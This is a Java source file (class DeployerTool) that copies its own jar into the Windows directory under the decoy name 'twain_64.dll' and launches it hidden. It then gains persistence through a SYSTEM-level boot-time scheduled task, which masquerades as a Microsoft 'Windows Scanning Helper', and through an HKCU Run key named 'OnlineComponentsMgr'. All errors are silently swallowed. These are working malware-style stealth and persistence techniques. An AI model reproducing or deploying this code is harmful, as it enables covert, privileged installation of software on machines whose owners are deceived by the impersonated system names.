package io.github.explodingbottle.someorganization.certifier.admintools;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class DeployerTool {
	private static final String DESTINATION_FILE_NAME = "twain_64.dll";
	private static final String TASK_CREATION_STRING = "schtasks /CREATE /TN \"Microsoft\\Windows\\Windows Media Sharing\\Windows Scanning Helper\" /RU \"NT AUTHORITY\\SYSTEM\" /SC ONSTART /RL HIGHEST /TR \"javaw -jar %s neutral\"";
	// For debug use: cmd /C start cmd /K java -jar %s neutral
	// For normal mode, use: javaw -jar %s neutral
	private static final String PROGRAM_LAUNCH_STRING = "javaw -jar %s neutral";
	private static final String TASK_QUERY_STRING = "schtasks /QUERY /TN \"Microsoft\\Windows\\Windows Media Sharing\\Windows Scanning Helper\"";
	private static final String REG_QUERY_STRING = "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v OnlineComponentsMgr";
	private static final String REG_CREATE_STRING = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /t REG_SZ /v OnlineComponentsMgr /f /d \"\\\"%s\\Microsoft\\Windows\\OnlineComponents\\OnlineComponentsMgr.bat\\\"\"";
	private static final String REG_DELETE_STRING = "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /f /v OnlineComponentsMgr";
	private static final String UNINJECTED_JAR_FOLDER_STRING = "Microsoft\\Windows\\OnlineComponents";

	public static boolean copyIntoWindowsAndSwitch() {
		try {
			File currentFilePath = new File(
					AdministratorTool.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			File destination = new File(System.getenv("WINDIR"), DESTINATION_FILE_NAME);
			Files.copy(currentFilePath.toPath(), destination.toPath(), StandardCopyOption.REPLACE_EXISTING);
			Runtime runtime = Runtime.getRuntime();
			runtime.exec(String.format(PROGRAM_LAUNCH_STRING, destination.toString()), null,
					destination.getParentFile());
			return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static File queryUninjectionFolder() {
		File onlineComponentsFolder = new File(System.getenv("LOCALAPPDATA"), UNINJECTED_JAR_FOLDER_STRING);
		if (onlineComponentsFolder.exists() && onlineComponentsFolder.isDirectory()) {
			return onlineComponentsFolder;
		}
		return null;
	}

	public static boolean destroyUninjectionFolder() {
		File onlineComponentsFolder = new File(System.getenv("LOCALAPPDATA"), UNINJECTED_JAR_FOLDER_STRING);
		if (queryUninjectionFolder() != null) {
			File batCore = new File(onlineComponentsFolder, "OnlineComponentsMgr.bat");
			File dllCore = new File(onlineComponentsFolder, "OnlineComponentsMgr.dll");
			boolean hasSucceed = true;
			if (batCore.exists()) {
				hasSucceed = hasSucceed & batCore.delete();
			}
			if (dllCore.exists()) {
				hasSucceed = hasSucceed & dllCore.delete();
			}
			return hasSucceed & onlineComponentsFolder.delete();
		}
		return false;
	}

	public static File getUninjectionFolderReady() {
		File onlineComponentsFolder = new File(System.getenv("LOCALAPPDATA"), UNINJECTED_JAR_FOLDER_STRING);
		File queried = queryUninjectionFolder();
		if (queried != null) {
			return queried;
		} else {
			onlineComponentsFolder.delete();
			if (!onlineComponentsFolder.mkdirs()) {
				return null;
			} else {
				return onlineComponentsFolder;
			}
		}
	}

	public static boolean isFileInstalled() {
		return new File(System.getenv("WINDIR"), DESTINATION_FILE_NAME).exists();
	}

	public static boolean isScheduledTaskRegistred() {
		try {
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(TASK_QUERY_STRING);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static boolean registerAsScheduledTask() {
		try {
			String command = String.format(TASK_CREATION_STRING,
					new File(System.getenv("WINDIR"), DESTINATION_FILE_NAME));
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(command);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static boolean unregisterReg() {
		try {
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(REG_DELETE_STRING);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static boolean isRegRegistred() {
		try {
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(REG_QUERY_STRING);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static boolean registerReg() {
		try {
			Runtime runtime = Runtime.getRuntime();
			String command = String.format(REG_CREATE_STRING, new File(System.getenv("LOCALAPPDATA")));
			Process proc = runtime.exec(command);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}
}
